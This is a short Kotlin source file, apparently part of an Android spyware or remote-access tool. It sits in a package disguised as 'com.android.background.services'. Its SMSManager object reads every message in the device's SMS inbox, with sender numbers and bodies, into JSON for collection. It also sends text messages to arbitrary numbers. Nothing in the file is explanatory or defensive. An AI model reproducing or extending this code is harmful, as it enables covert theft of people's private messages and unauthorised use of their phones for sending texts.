package com.android.background.services.helpers

import android.annotation.SuppressLint
import android.net.Uri
import android.telephony.SmsManager
import android.util.Log
import com.android.background.services.MainService
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject

object SMSManager {
    @JvmStatic
    fun getSMSList(): JSONObject? {
        try {
            val smsList = JSONObject()
            val list = JSONArray()
            val uriSmsUri = Uri.parse("content://sms/inbox")
            val cur = MainService.getContextOfApplication().contentResolver.query(uriSmsUri, null, null, null, null)
            cur?.use { cursor ->
                while (cursor.moveToNext()) {
                    val sms = JSONObject()
                    @SuppressLint("Range") val address = cursor.getString(cursor.getColumnIndex("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    sms.put("phoneNo", address)
                    sms.put("msg", body)
                    list.put(sms)
                }
            }
            smsList.put("smsList", list)
            Log.e("done", "collecting")
            return smsList
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        return null
    }

    @JvmStatic
    fun sendSMS(phoneNo: String?, msg: String?): Boolean {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNo, null, msg, null, null)
            true
        } catch (ex: Exception) {
            ex.printStackTrace()
            false
        }
    }
}
